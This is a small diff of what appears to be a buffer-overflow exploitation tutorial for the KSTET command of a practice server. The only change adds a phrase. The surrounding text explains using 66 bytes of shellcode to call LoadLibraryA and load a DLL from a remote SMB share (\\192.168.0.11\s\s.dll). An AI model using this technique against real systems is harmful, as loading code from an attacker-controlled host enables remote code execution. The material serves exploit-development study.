@@ -76,7 +76,7 @@ If we set a breakpoint on `0040100C` and run our exploit, we'll see our EIP over
 
 The first instructions we encounter are the 'KSTET ' command, including the space. Lucky for us these are not detrimental to our execution and we can easily step through until we reach our buffer of `A`'s. It looks like we have about 66 bytes for our shellcode. This is plenty for socket re-use, which can be done in about half that, but it's also plenty for our LoadLibraryA call. 
 In order to perform our LoadLibraryA call, we'll need to get the following values onto the stack:
-`\\192.168.0.11\s\s.dll`. In this case, to save space, I opted for the smallest possible string length to keep our shellcode to a minimum. This is why I chose a one-character folder name and the smallest dll name. If we want to quickly convert this string into opcodes to push onto the stack, we have to first split it into groups of 4 characters:
+`\\192.168.0.11\s\s.dll`. In this case, to save space, I opted for the smallest possible string length to keep our shellcode to a minimum (more on that later). This is why I chose a one-character folder name and the smallest dll name. If we want to quickly convert this string into opcodes to push onto the stack, we have to first split it into groups of 4 characters:
 ```
 \\19
 2.16
